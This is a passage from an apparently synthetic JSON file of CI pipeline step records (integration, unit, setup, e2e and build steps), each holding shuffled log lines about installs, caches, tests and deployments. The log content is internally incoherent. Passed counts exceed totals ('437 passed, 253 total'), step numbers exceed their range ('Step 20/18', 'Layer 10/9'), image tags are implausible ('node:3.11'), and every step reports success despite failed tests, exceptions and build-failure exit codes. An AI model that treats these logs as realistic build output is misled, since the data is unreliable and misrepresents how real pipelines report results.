          "\u2717 build failed with exit code 118",
          "POST /upload - 201 (381ms)",
          "Image pulled successfully",
          "Cache saved successfully",
          "[12:17:55] INFO: Request completed",
          "Tests: 437 passed, 253 total",
          "Test Suites: 39 passed, 6 total",
          "Cache restored successfully (147MB)",
          "  PASS: unit/test_auth_login.spec.js",
          "Using Python 3.10",
          "Cache miss for key-4244",
          "OK",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2717 build failed with exit code 77",
          "[12:17:55] DEBUG: Loading configuration",
          "Already up to date.",
          "Time: 112.802s",
          "Step 13/22: Running migrations",
          "NODE_ENV=production",
          "Step 1/25: Building",
          "Transforming 163 files...",
          "npm install: resolved 181 packages",
          "Ready.",
          "Waiting...",
          "Time: 28.739s",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache saved successfully",
          "Success!",
          "Test Suites: 46 passed, 5 total",
          "Cache saved successfully",
          "pip install: Successfully installed webpack-4.12",
          "npm install: added 152 packages",
          "[12:17:55] INFO: Request completed",
          "[12:17:55] DEBUG: Connection pool: 20 active",
          "Uploading artifact 'coverage' (22 files)",
          "[12:17:55] DEBUG: Query executed in 6ms",
          "Step 16/16: Testing",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 Task completed in 3866ms",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-25T12:19:09.401853",
        "finished_at": "2025-11-25T12:19:31.954846",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Checking out master branch",
          "[12:17:55] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Completed.",
          "\u2713 All checks passed",
          "Layer 6/13: COPY command",
          "Pushing to registry...",
          "Cache hit for key-2735",
          "Step 14/20: Testing",
          "Artifact uploaded: dist.zip (63MB)",
          "Step 13/25: Testing",
          "Done.",
          "Finished.",
          "[12:17:55] INFO: Request completed",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Using Node.js 15.4.0",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 3MB",
          "Completed.",
          "Cache saved successfully",
          "Checking out main branch",
          "TLS handshake completed",
          "  PASS: test_api_health (86ms)",
          "Using Python 3.11",
          "Coverage: 83% statements, 93% branches",
          "Installing express@4.7.5",
          "Platform: linux-x64",
          "  PASS: test_cache_hit (268ms)",
          "GET /health - 200 (22ms)",
          "pip: Installing build dependencies...",
          "[12:17:55] WARN: Deprecated API usage",
          "pip install: Successfully installed lodash-3.9",
          "Cache hit for key-5032",
          "yarn add: Done in 7.74s",
          "Pulling image: node:18",
          "Coverage: 88% statements, 88% branches",
          "Transforming 828 files...",
          "[12:17:55] INFO: Starting build process",
          "[12:17:55] INFO: Cache refreshed",
          "Layer 8/11: ENV command",
          "  PASS: test_db_connect (337ms)",
          "Loading...",
          "Bundling styles.js",
          "TLS handshake completed",
          "[12:17:55] DEBUG: Memory usage: 1860MB",
          "yarn add: Done in 3.38s",
          "[12:17:55] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Tests: 177 passed, 242 total",
          "Bundling runtime.css",
          "Verifying...",
          "pip: Downloading express-1.2.tar.gz",
          "Platform: win32-x64",
          "Creating production build...",
          "Success!",
          "[12:17:55] DEBUG: Connection pool: 16 active",
          "Already up to date.",
          "Step 2/24: Running migrations",
          "POST /upload - 201 (16ms)",
          "[12:17:55] DEBUG: Connection pool: 16 active",
          "[12:17:55] INFO: Connecting to database",
          "Step 3/18: Installing dependencies",
          "Environment: production",
          "[12:17:55] DEBUG: Query executed in 90ms",
          "  PASS: unit/test_api_health.spec.js",
          "[12:17:55] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 11/25: Building",
          "Layer 8/8: COPY command",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/index.js...",
          "TLS handshake completed",
          "npm install: added 318 packages",
          "Success!",
          "Environment: production",
          "Step 20/18: Linting",
          "Cache invalidated: dependencies",
          "Tests: 262 passed, 319 total",
          "Generating source maps...",
          "Verifying...",
          "Step 19/19: Running migrations",
          "Compiling utils/index.js...",
          "Generating source maps...",
          "Using Python 3.9",
          "Artifact downloaded: 24MB",
          "Step 1/22: Deploying",
          "Generating source maps...",
          "Pulling image: node:3.11",
          "pip: Downloading webpack-5.16.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "FAILED: test_auth_login",
          "Success!",
          "Artifact uploaded: dist.zip (45MB)",
          "[12:17:55] WARN: Deprecated API usage",
          "Bundling styles.js",
          "GET /status - 204 (16ms)",
          "Cache miss for key-2500",
          "Installing react@4.5.10",
          "Fetching submodules...",
          "OK",
          "npm notice: package.json updated",
          "Step 15/16: Deploying",
          "Transforming 219 files...",
          "HEAD is now at efe567b",
          "[12:17:55] DEBUG: Loading configuration",
          "Completed.",
          "[12:17:55] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "OK",
          "Cache hit for key-2288",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 14/15: Deploying",
          "Cache saved successfully",
          "[12:17:55] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Time: 63.156s",
          "Already up to date.",
          "Using Python 3.10",
          "Environment: test",
          "Compiling lib/handler.rs...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "npm install: added 200 packages",
          "Ready.",
          "Compiling lib/index.js...",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:17:55] INFO: Request completed",
          "Compiling utils/main.py...",
          "Layer 6/15: RUN command",
          "[12:17:55] INFO: Connecting to database",
          "Uploading artifact 'build' (8 files)",
          "Creating production build...",
          "Loading...",
          "[12:17:55] INFO: Processing request",
          "Checking out main branch",
          "Pushing to registry...",
          "npm install: added 55 packages",
          "pip: Downloading express-4.8.tar.gz",
          "\u2713 test completed",
          "Installing prettier@1.4.8",
          "pip: Collecting eslint",
          "Cache saved successfully",
          "Switched to branch 'bugfix/task-919'",
          "Image pulled successfully",
          "Artifact downloaded: 42MB",
          "[12:17:55] INFO: Request completed",
          "\u2713 package completed",
          "NODE_ENV=production",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Verifying...",
          "[12:17:55] INFO: Starting build process",
          "pip install: Successfully installed express-1.14",
          "\u2713 Task completed in 1670ms",
          "Snapshots: 31 passed, 31 total",
          "[12:17:55] DEBUG: Memory usage: 330MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "Loading...",
          "TLS handshake completed",
          "Minifying app.js",
          "Exception: ValueError",
          "Generating source maps...",
          "Generating source maps...",
          "Pushing to registry...",
          "Switched to branch 'feature/task-285'",
          "Using Python 3.11",
          "NODE_ENV=production",
          "Coverage: 77% statements, 92% branches",
          "Step 12/20: Linting",
          "[12:17:55] INFO: Starting build process",
          "Minifying app.js",
          "GET /status - 200 (69ms)",
          "npm install: resolved 1072 packages",
          "Uploading artifact 'coverage' (2 files)",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "NODE_ENV=development",
          "HEAD is now at f32a1fb",
          "Bundling runtime.css",
          "Step 4/22: Deploying",
          "Finished.",
          "Pushing to registry...",
          "Waiting...",
          "  PASS: test_cache_hit (270ms)",
          "[12:17:55] INFO: Starting build process",
          "Compiling utils/service.java...",
          "Creating production build...",
          "[12:17:55] DEBUG: Loading configuration",
          "Cache hit for key-9962",
          "Image pulled successfully",
          "Cache hit for key-5143",
          "Minifying vendor.js",
          "Using Python 3.11",
          "Loading...",
          "Compiling utils/index.js...",
          "[12:17:55] INFO: Starting build process",
          "Pushing to registry...",
          "Verifying...",
          "[12:17:55] DEBUG: Connection pool: 1 active",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-25T12:19:31.954846",
        "finished_at": "2025-11-25T12:20:05.784335",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Checking out develop branch",
          "Cache hit for key-5910",
          "Transforming 249 files...",
          "Using Python 3.11",
          "WARNING: express has known vulnerabilities",
          "Installing prettier@4.16.1",
          "Cache hit for key-4927",
          "Done.",
          "Compiling components/main.py...",
          "POST /api - 202 (444ms)",
          "Pushing to registry...",
          "npm install: resolved 716 packages",
          "Cache hit for key-7737",
          "[12:17:55] DEBUG: Initializing service",
          "Layer 5/8: ENV command",
          "Uploading artifact 'dist' (34 files)",
          "Connection established",
          "HEAD is now at 525117c",
          "OK",
          "\u2717 build failed with exit code 83",
          "Platform: darwin-arm64",
          "Pulling image: python:3.11",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "yarn add: Done in 5.1s",
          "Building Docker image...",
          "Image pulled successfully",
          "Cache restored successfully (386MB)",
          "Step 15/23: Linting",
          "OK",
          "OK",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 55",
          "Loading...",
          "[12:17:55] INFO: Starting build process",
          "Already up to date.",
          "npm install: resolved 445 packages",
          "Connection established",
          "[12:17:55] INFO: Request completed",
          "Exception: NullPointerException",
          "Environment: development",
          "Completed.",
          "[12:17:55] WARN: Deprecated API usage",
          "npm install: resolved 1357 packages",
          "Step 20/19: Testing",
          "pip install: Successfully installed express-1.16",
          "[12:17:55] DEBUG: Memory usage: 526MB",
          "Uploading artifact 'build' (22 files)",
          "Coverage: 84% statements, 70% branches",
          "Connecting to example.com:443...",
          "Switched to branch 'bugfix/task-950'",
          "\u2713 Step 'build' succeeded",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "POST /data - 200 (143ms)",
          "Connection established",
          "Image pulled successfully",
          "Pushing to registry...",
          "Step 15/16: Installing dependencies",
          "Switched to branch 'bugfix/task-284'",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Creating production build...",
          "Switched to branch 'feature/task-586'",
          "Waiting...",
          "\u2713 All checks passed",
          "Time: 93.900s",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "npm notice: package.json updated",
          "Done.",
          "Waiting...",
          "Generating source maps...",
          "WARNING: webpack has known vulnerabilities",
          "npm install: added 477 packages",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "[12:17:55] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "pip: Collecting jest",
          "Verifying...",
          "Waiting...",
          "[12:17:55] DEBUG: Connection pool: 14 active",
          "Connection established",
          "Cache saved successfully",
          "Checking out master branch",
          "NODE_ENV=test",
          "Cache saved successfully",
          "Compiling components/main.py...",
          "Artifact downloaded: 38MB",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Compiling src/index.js...",
          "Step 14/23: Deploying",
          "Building Docker image...",
          "Creating production build...",
          "npm notice: package.json updated",
          "Cache invalidated: node_modules",
          "Processing...",
          "\u2713 Step 'setup' succeeded",
          "Installing jest@2.3.4",
          "NODE_ENV=production",
          "[12:17:55] DEBUG: Memory usage: 299MB",
          "Ran 115 tests in 49s",
          "Cache restored successfully (117MB)",
          "Pushing to registry...",
          "Step 8/16: Linting",
          "Artifact uploaded: dist.zip (69MB)",
          "Loading...",
          "Connecting to startup.dev:443...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Coverage: 97% statements, 96% branches",
          "npm notice: created a lockfile",
          "NODE_ENV=test",
          "pip install: Successfully installed prettier-1.14",
          "[12:17:55] INFO: Processing request",
          "[12:17:55] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Environment: development",
          "Uploading artifact 'build' (25 files)",
          "WARNING: lodash has known vulnerabilities",
          "[12:17:55] DEBUG: Memory usage: 1424MB",
          "[12:17:55] DEBUG: Memory usage: 1867MB",
          "Coverage: 79% statements, 98% branches",
          "npm notice: package.json updated",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 8/15: Installing dependencies",
          "Compiling components/index.js...",
          "Image pulled successfully",
          "[12:17:55] WARN: Deprecated API usage",
          "Exception: TypeError",
          "pip: Downloading express-1.3.tar.gz",
          "WARNING: lodash has known vulnerabilities",
          "Already up to date.",
          "[12:17:55] DEBUG: Memory usage: 1553MB",
          "Time: 106.289s",
          "Using Python 3.11",
          "Minifying app.js",
          "Exception: ValueError",
          "WARNING: eslint has known vulnerabilities",
          "Already up to date.",
          "Installing express@4.19.5",
          "Step 6/17: Installing dependencies",
          "\u2713 Step 'setup' succeeded",
          "Coverage: 88% statements, 81% branches",
          "Bundling runtime.js",
          "POST /data - 200 (172ms)",
          "Connection established",
          "Cache miss for key-9049",
          "Bundling vendor.css",
          "pip: Downloading webpack-3.8.tar.gz",
          "Environment: test",
          "Snapshots: 28 passed, 23 total",
          "Pushing to registry...",
          "Time: 26.595s",
          "Waiting...",
          "Time: 55.930s",
          "Switched to branch 'hotfix/task-362'",
          "Step 10/19: Building",
          "Tests: 152 passed, 456 total",
          "Compiling lib/service.java...",
          "Checking out develop branch",
          "Optimizing 19 modules...",
          "Step 17/16: Testing",
          "Cache hit for key-5103",
          "Coverage: 74% statements, 80% branches",
          "[12:17:55] DEBUG: Memory usage: 604MB",
          "Cache invalidated: build",
          "\u2713 Step 'checkout' succeeded",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:17:55] INFO: Connecting to database",
          "Step 9/25: Linting",
          "Pulling image: python:3.11",
          "WARNING: prettier has known vulnerabilities",
          "Environment: production",
          "[12:17:55] WARN: Deprecated API usage",
          "Exception: ValueError",
          "pip: Downloading lodash-1.2.tar.gz",
          "Coverage: 72% statements, 87% branches",
          "Step 20/25: Running migrations",
          "Creating production build...",
          "[12:17:55] INFO: Cache refreshed",
          "Cache invalidated: node_modules",
          "Platform: darwin-arm64",
          "Layer 2/15: ENV command",
          "[12:17:55] INFO: Processing request",
          "NODE_ENV=production",
          "Compiling components/service.java...",
          "Uploading artifact 'dist' (15 files)",
          "Verifying...",
          "Finished.",
          "  PASS: e2e/test_auth_login.spec.js",
          "  PASS: e2e/test_db_connect.spec.js",
          "Processing...",
          "Generating source maps...",
          "[12:17:55] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-811'",
          "Exception: RuntimeError",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:20:05.784335",
        "finished_at": "2025-11-25T12:20:17.060831",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:17:55] DEBUG: Query executed in 44ms",
          "[12:17:55] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (79MB)",
          "Pushing to registry...",
          "Step 8/16: Linting",
          "Processing...",
          "Image pulled successfully",
          "Step 12/25: Deploying",
          "Installing webpack@2.14.5",
          "Loading...",
          "[12:17:55] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Layer 6/9: ENV command",
          "Minifying app.js",
          "[12:17:55] INFO: Starting build process",
          "Step 13/19: Deploying",
          "Step 2/23: Linting",
          "Compiling components/main.py...",
          "Using Python 3.10",
          "[12:17:55] DEBUG: Connection pool: 18 active",
          "[12:17:55] DEBUG: Query executed in 67ms",
          "Ready.",
          "Platform: win32-x64",
          "pip: Downloading axios-3.0.tar.gz",
          "Switched to branch 'hotfix/task-560'",
          "[12:17:55] ERROR: Connection failed",
          "Loading...",
          "\u2713 Task completed in 1233ms",
          "Switched to branch 'feature/task-834'",
          "Already up to date.",
          "Layer 6/13: ENV command",
          "Switched to branch 'hotfix/task-362'",
          "Exception: NullPointerException",
          "[12:17:55] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Creating production build...",
          "GET /status - 201 (82ms)",
          "[12:17:55] DEBUG: Memory usage: 1604MB",
          "[12:17:55] INFO: Connecting to database",
          "Coverage: 99% statements, 81% branches",
          "Bundling main.js",
          "Installing express@4.9.0",
          "Artifact uploaded: dist.zip (12MB)",
          "Snapshots: 39 passed, 41 total",
          "npm notice: package.json updated",
          "[12:17:55] WARN: Deprecated API usage",
          "Pushing to registry...",
          "POST /data - 200 (31ms)",
          "Cache miss for key-1852",
          "Step 13/23: Linting",
          "Environment: production",
          "npm notice: package.json updated",
          "Minifying app.js",
          "\u2717 build failed with exit code 72",
          "Minifying vendor.js",
          "OK",
          "[12:17:55] WARN: Deprecated API usage",
          "Cache restored successfully (283MB)",
          "Cache hit for key-1233",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 8/25: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Using Python 3.12",
          "Compiling utils/handler.rs...",
          "POST /api - 201 (66ms)",
          "Creating production build...",
          "Step 20/20: Running migrations",
          "Exception: RuntimeError",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/25: Building",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Coverage: 97% statements, 86% branches",
          "Cache restored successfully (272MB)",
          "Step 9/25: Installing dependencies",
          "Verifying...",
          "Loading...",
          "Already up to date.",
          "Cache miss for key-5755",
          "Coverage: 70% statements, 99% branches",
          "Verifying...",
          "Cache invalidated: node_modules",
          "\u2713 Step 'install' succeeded",
          "Connecting to example.com:443...",
          "Snapshots: 28 passed, 39 total",
          "Cache invalidated: dependencies",
          "npm notice: package.json updated",
          "Step 2/19: Running migrations",
          "Using Node.js 19.6.3",
          "Step 14/25: Linting",
          "\u2713 build completed",
          "\u2717 build failed with exit code 51",
          "Coverage: 73% statements, 73% branches",
          "Artifact uploaded: dist.zip (97MB)",
          "[12:17:55] DEBUG: Loading configuration",
          "pip: Collecting prettier",
          "Coverage: 81% statements, 83% branches",
          "WARNING: eslint has known vulnerabilities",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Step 17/23: Building",
          "[12:17:55] INFO: Connecting to database",
          "Cache restored successfully (134MB)",
          "[12:17:55] INFO: Starting build process",
          "[12:17:55] WARN: Deprecated API usage",
          "Completed.",
          "Compiling lib/handler.rs...",
          "Loading...",
          "Ran 125 tests in 41s",
          "Snapshots: 25 passed, 30 total",
          "Step 2/23: Installing dependencies",
          "Switched to branch 'feature/task-939'",
          "  PASS: test_api_health (2ms)",
          "HEAD is now at f7e0675",
          "[12:17:55] INFO: Starting build process",
          "Step 20/17: Deploying",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: express has known vulnerabilities",
          "Step 17/23: Linting",
          "[12:17:55] DEBUG: Loading configuration",
          "Optimizing 89 modules...",
          "npm install: resolved 1188 packages",
          "Minifying app.js",
          "Already up to date.",
          "[12:17:55] DEBUG: Query executed in 76ms",
          "Checking out develop branch",
          "Snapshots: 13 passed, 28 total",
          "Step 11/22: Running migrations",
          "Layer 9/15: ENV command",
          "npm install: resolved 405 packages",
          "Test Suites: 24 passed, 22 total",
          "[12:17:55] INFO: Request completed",
          "pip: Downloading jest-5.9.tar.gz",
          "OK",
          "Loading...",
          "GET /health - 200 (61ms)",
          "Using Node.js 16.0.2",
          "Building Docker image...",
          "Waiting...",
          "Checking out main branch",
          "[12:17:55] INFO: Starting build process",
          "pip: Downloading axios-3.13.tar.gz",
          "Loading...",
          "Verifying...",
          "Compiling components/main.py...",
          "  PASS: test_auth_login (175ms)",
          "Compiling lib/handler.rs...",
          "Using Python 3.9",
          "[12:17:55] INFO: Connecting to database",
          "Compiling src/handler.rs...",
          "yarn add: Done in 15.45s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Task completed in 1447ms",
          "Cache hit for key-7490",
          "Connecting to startup.dev:443...",
          "HEAD is now at 33afe94",
          "Completed.",
          "Cache invalidated: dependencies",
          "Loading...",
          "Compiling utils/app.ts...",
          "Finished.",
          "Step 12/20: Installing dependencies",
          "Image pulled successfully",
          "Step 15/17: Running migrations",
          "pip: Collecting axios",
          "Cache miss for key-3615",
          "WARNING: lodash has known vulnerabilities",
          "[12:17:55] WARN: Deprecated API usage",
          "pip: Collecting axios",
          "Generating source maps...",
          "Success!",
          "[12:17:55] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-551'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 485ms",
          "Coverage: 70% statements, 62% branches",
          "Compiling src/app.ts...",
          "Fetching submodules...",
          "Step 16/20: Building",
          "Cache restored successfully (498MB)",
          "Pulling image: python:3.11",
          "Loading...",
          "Step 15/23: Building",
          "  PASS: test_user_create (265ms)",
          "Building Docker image...",
          "Tests: 171 passed, 357 total",
          "Exception: TypeError",
          "Layer 4/10: COPY command",
          "Cache miss for key-6977",
          "Installing eslint@3.17.9",
          "pip: Installing build dependencies...",
          "[12:17:55] DEBUG: Loading configuration",
          "pip install: Successfully installed eslint-3.20",
          "Minifying app.js",
          "Cache miss for key-6051",
          "Compiling utils/utils.go...",
          "npm notice: created a lockfile",
          "[12:17:55] INFO: Cache refreshed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:20:17.060831",
        "finished_at": "2025-11-25T12:20:28.337327",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Finished.",
          "Uploading artifact 'dist' (49 files)",
          "NODE_ENV=production",
          "Step 8/23: Installing dependencies",
          "Step 17/15: Linting",
          "Building Docker image...",
          "\u2713 deploy completed",
          "Cache saved successfully",
          "Time: 31.22s",
          "Snapshots: 29 passed, 1 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 12/24: Running migrations",
          "GET /api - 201 (22ms)",
          "npm install: added 91 packages",
          "pip install: Successfully installed jest-2.8",
          "[12:17:55] DEBUG: Memory usage: 1254MB",
          "Cache hit for key-8080",
          "[12:17:55] INFO: Cache refreshed",
          "Compiling lib/main.py...",
          "Compiling lib/handler.rs...",
          "npm install: resolved 554 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip install: Successfully installed axios-4.6",
          "pip: Installing build dependencies...",
          "FAILED: test_db_connect",
          "Fetching submodules...",
          "Environment: test",
          "Success!",
          "Cache restored successfully (120MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:55] WARN: Deprecated API usage",
          "Installing webpack@4.20.2",
          "Processing...",
          "Compiling utils/app.ts...",
          "Processing...",
          "Pulling image: alpine:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'dist' (3 files)",
          "\u2717 build failed with exit code 9",
          "Step 18/22: Testing",
          "Time: 120.316s",
          "Ready.",
          "Building Docker image...",
          "[12:17:55] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:17:55] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (74MB)",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "[12:17:55] INFO: Request completed",
          "Snapshots: 13 passed, 32 total",
          "Layer 10/9: ENV command",
          "Exception: NullPointerException",
          "Cache hit for key-1851",
          "Test Suites: 11 passed, 29 total",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:55] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Installing lodash@5.2.2",
          "Step 11/18: Testing",
          "Image pulled successfully",
          "pip install: Successfully installed express-2.15",
          "Cache miss for key-8050",
          "Pulling image: node:3.11",
          "Connection established",
          "Step 12/25: Linting",
          "Bundling main.css",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1574 packages",
          "Transforming 642 files...",
          "Done.",
          "Bundling vendor.css",
          "[12:17:55] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Compiling components/main.py...",
          "[12:17:55] INFO: Starting build process",
          "Waiting...",
          "Compiling src/service.java...",
          "Cache miss for key-7315",
          "Connection established",
          "pip: Installing build dependencies...",
          "Optimizing 62 modules...",
          "\u2713 lint completed",
          "POST /data - 202 (338ms)",
          "Compiling lib/index.js...",
          "Cache hit for key-4510",
          "GET /status - 200 (100ms)",
          "[12:17:55] DEBUG: Loading configuration",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (48MB)",
          "Step 19/17: Linting",
          "Fetching submodules...",
          "NODE_ENV=test",
          "POST /api - 200 (378ms)",
          "Minifying vendor.js",
          "NODE_ENV=production",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "[12:17:55] INFO: Starting build process",
          "HEAD is now at 064253d",
          "npm notice: package.json updated",
          "Finished.",
          "Step 19/21: Running migrations",
          "Connecting to startup.dev:443...",
          "Pushing to registry...",
          "Building Docker image...",
          "[12:17:55] DEBUG: Query executed in 11ms",
          "Transforming 649 files...",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-934'",
          "Artifact uploaded: dist.zip (39MB)",
          "yarn add: Done in 10.87s",
          "npm install: resolved 1596 packages",
          "pip: Collecting lodash",
          "Generating source maps...",
          "Ran 170 tests in 42s",
          "NODE_ENV=test",
          "Tests: 106 passed, 415 total",
          "Already up to date.",
          "Image pulled successfully",
          "Building Docker image...",
          "Success!",
          "Ready.",
          "Environment: test",
          "  PASS: e2e/test_auth_login.spec.js",
          "Ran 18 tests in 21s",
          "Bundling vendor.js",
          "Compiling components/utils.go...",
          "Minifying vendor.js",
          "FAILED: test_db_connect",
          "Cache invalidated: build",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Step 8/15: Linting",
          "Ready.",
          "Exception: NullPointerException",
          "HEAD is now at b17223f",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "OK",
          "Cache saved successfully",
          "Creating production build...",
          "yarn add: Done in 15.82s",
          "Using Python 3.11",
          "Tests: 66 passed, 258 total",
          "npm install: added 496 packages",
          "TLS handshake completed",
          "Snapshots: 21 passed, 12 total",
          "Connection established",
          "Compiling components/utils.go...",
          "Cache saved successfully",
          "Creating production build...",
          "Test Suites: 17 passed, 7 total",
          "GET /api - 200 (16ms)",
          "[12:17:55] DEBUG: Connection pool: 10 active",
          "Using Node.js 18.16.1",
          "npm install: resolved 784 packages",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "[12:17:55] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "[12:17:55] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 59",
          "Switched to branch 'hotfix/task-583'",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Success!",
          "POST /data - 200 (192ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Bundling main.css",
          "Platform: darwin-arm64",
          "pip install: Successfully installed express-1.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "Artifact downloaded: 34MB",
          "Minifying vendor.js",
          "npm install: resolved 1541 packages",
          "[12:17:55] WARN: Deprecated API usage",
          "[12:17:55] DEBUG: Initializing service",
          "[12:17:55] INFO: Starting build process",
          "\u2713 All checks passed",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 6MB",
          "FAILED: test_api_health",
          "Compiling lib/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Python 3.9",
          "FAILED: test_cache_hit",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-25T12:20:28.337327",
        "finished_at": "2025-11-25T12:21:02.166816",
        "log_lines": [
          "=== Step: build ===",
          "npm install: added 400 packages",
          "npm install: added 229 packages",
          "[12:17:55] ERROR: Connection failed",
          "OK",
          "\u2713 Task completed in 3055ms",
          "Cache hit for key-3764",
          "Step 11/17: Testing",
          "Step 18/22: Running migrations",
          "  PASS: e2e/test_api_health.spec.js",
          "Fetching submodules...",
          "Already up to date.",
          "Generating source maps...",
          "Step 15/23: Building",
          "Done.",
          "yarn add: Done in 20.60s",
          "Pulling image: python:18",
          "Step 14/18: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "Loading...",
          "Connection established",
          "Bundling vendor.js",
          "\u2713 Step 'setup' succeeded",
          "Completed.",
          "[12:17:55] DEBUG: Query executed in 54ms",
          "HEAD is now at 323b02f",
          "[12:17:55] INFO: Request completed",
          "Finished.",
          "Step 17/15: Linting",
          "[12:17:55] WARN: Deprecated API usage",
          "Finished.",
          "Connection established",
          "  PASS: test_auth_login (300ms)",
          "Bundling styles.js",
          "Compiling components/service.java...",
          "\u2713 validate completed",
          "Connecting to acme.corp:443...",
          "[12:17:55] WARN: Deprecated API usage",
          "[12:17:55] INFO: Connecting to database",
          "Coverage: 83% statements, 83% branches",
          "  PASS: test_auth_login (304ms)",
          "Snapshots: 15 passed, 23 total",
          "Ran 31 tests in 54s",
          "pip: Downloading eslint-3.4.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Pushing to registry...",
          "[12:17:55] DEBUG: Query executed in 40ms",
          "Test Suites: 18 passed, 9 total",
          "OK",
          "  PASS: e2e/test_auth_login.spec.js",
          "Compiling utils/app.ts...",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "NODE_ENV=test",
          "Compiling lib/index.js...",
          "WARNING: prettier has known vulnerabilities",
          "[12:17:55] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
